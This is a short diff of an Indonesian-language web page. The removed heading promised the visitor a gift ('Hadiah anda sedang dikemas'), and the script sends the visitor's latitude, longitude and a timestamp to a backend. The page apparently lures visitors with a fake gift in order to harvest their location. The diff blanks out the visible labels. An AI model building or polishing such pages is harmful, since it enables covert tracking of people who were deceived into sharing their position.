@@ -17,7 +17,7 @@
   </style>
 </head>
 <body>
-  <h2>Hadiah anda sedang dikemas</h2>m
+  <h2></h2>
   <p class="status">Tunggu beberapa saat.</p>
 
   <script type="module">
@@ -47,7 +47,7 @@
         lng: lng,
         waktu: new Date().toISOString()
       }).then(() => {
-        statusEl.textContent = `Data sedang diproses: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+        statusEl.textContent = `: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
       }).catch(err => {
         statusEl.textContent = 'Gagal kirim data';
         console.error(err);
